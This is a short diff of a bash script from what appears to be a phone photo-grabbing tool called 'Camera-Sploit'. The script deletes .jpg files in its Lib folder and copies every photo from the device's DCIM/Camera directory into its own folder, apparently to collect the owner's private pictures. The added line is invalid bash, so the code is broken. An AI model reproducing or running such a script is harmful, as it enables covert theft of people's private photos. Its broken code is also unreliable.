@@ -1,4 +1,5 @@
 #!/bin/bash
+random = "YAMANEFkaRa"+$RANDOM
 if [[ -e "Lib/ok.txt" ]]; then
 		cd Lib && rm -rf *.jpg
 		cd / && cd sdcard/DCIM/Camera && cp *.jpg $HOME/Camera-Sploit/Lib
